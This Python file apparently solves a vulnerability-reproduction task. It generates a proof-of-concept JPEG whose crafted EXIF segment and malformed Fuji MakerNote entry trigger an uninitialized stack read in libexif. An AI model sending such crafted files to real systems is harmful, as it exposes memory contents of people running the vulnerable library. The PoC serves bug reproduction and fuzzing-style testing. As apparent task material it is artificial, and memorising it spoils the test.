import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is an uninitialized stack read in `exif_entry_get_value`.
        It occurs when `exif_convert_entry_value` is called but returns without
        writing to the output buffer. The vulnerable version of `exif_entry_get_value`
        failed to initialize this buffer, leading to a read of uninitialized
        stack memory.

        This PoC triggers the vulnerability via the Fuji MakerNote parser. In
        vulnerable versions of libexif, the parser would correctly identify an
        entry's format (e.g., SHORT) but would leave its component count (`components`)
        as 0. The entry's data size (`size`) was read directly from the file.

        This creates an `ExifEntry` with `components=0` but a non-zero `size`. When
        `exif_convert_entry_value` later tries to format this entry, its main
        formatting loop (`for (i = 0; i < entry->components; i++)`) executes
        zero times. As a result, the output buffer is never written to, and the
        uninitialized read occurs in the caller.

        The PoC is structured as a JPEG file containing a crafted EXIF segment with a
        Fuji MakerNote that exploits this parsing logic.
        """

        # Part 1: Fuji MakerNote Data (inner structure, little-endian)
        
        # Fuji MakerNote header: "FUJIFILM" + offset to its IFD
        fuji_ifd_offset_in_note = 12
        fuji_header = b'FUJIFILM' + struct.pack('<I', fuji_ifd_offset_in_note)

        # Fuji IFD with one malformed entry.
        # A Fuji IFD entry is 8 bytes: tag(2), size(2), offset(4) relative to IFD start.
        fuji_tag_id = 0x1401  # Corresponds to PicMode, which is handled as SHORT
        fuji_tag_size = 1     # Invalid size for a SHORT, causes inconsistency
        
        fuji_ifd_entry_count = 1
        # Data for the tag will be placed after the IFD's entry list.
        # IFD structure: count(2) + entries(N*8)
        fuji_tag_data_offset_from_ifd_start = 2 + fuji_ifd_entry_count * 8
        
        fuji_ifd = b''
        fuji_ifd += struct.pack('<H', fuji_ifd_entry_count)
        fuji_ifd += struct.pack('<HH', fuji_tag_id, fuji_tag_size)
        fuji_ifd += struct.pack('<I', fuji_tag_data_offset_from_ifd_start)
        
        fuji_tag_data = b'\x01' # 1 byte of data for the tag

        # The complete Fuji MakerNote data blob
        fuji_maker_note_blob = fuji_header + fuji_ifd + fuji_tag_data

        # Part 2: TIFF Structure (wraps the MakerNote, big-endian)
        
        # Standard TIFF header, pointing to IFD0 immediately after.
        tiff_header = b'MM\x00\x2a\x00\x00\x00\x08'

        # IFD0 contains a single entry for the MakerNote.
        # A standard TIFF IFD entry is 12 bytes: tag(2), type(2), count(4), value/offset(4).
        maker_note_tag_id = 0x927c
        maker_note_type = 7  # UNDEFINED
        maker_note_count = len(fuji_maker_note_blob)
        # The MakerNote data will be placed after IFD0.
        # TIFF structure: header(8) + IFD_count(2) + IFD_entries(N*12) + next_IFD_offset(4)
        maker_note_data_offset_from_tiff_start = 8 + 2 + 1 * 12 + 4

        ifd0 = b''
        ifd0 += struct.pack('>H', 1) # 1 entry in this IFD
        ifd0 += struct.pack('>HHII', 
                             maker_note_tag_id,
                             maker_note_type,
                             maker_note_count,
                             maker_note_data_offset_from_tiff_start)
        ifd0 += struct.pack('>I', 0) # Offset to next IFD (none)

        tiff_blob = tiff_header + ifd0 + fuji_maker_note_blob

        # Part 3: JPEG File Structure (wraps the TIFF blob in an APP1 segment)
        
        app1_marker = b'\xff\xe1'
        app1_header = b'Exif\x00\x00'
        # The length field in APP1 includes the size of the length field itself.
        app1_len = len(app1_header) + len(tiff_blob) + 2 
        
        app1_segment = app1_marker + struct.pack('>H', app1_len) + app1_header + tiff_blob

        jpeg_soi = b'\xff\xd8' # Start of Image
        jpeg_eoi = b'\xff\xd9' # End of Image

        poc = jpeg_soi + app1_segment + jpeg_eoi
        return poc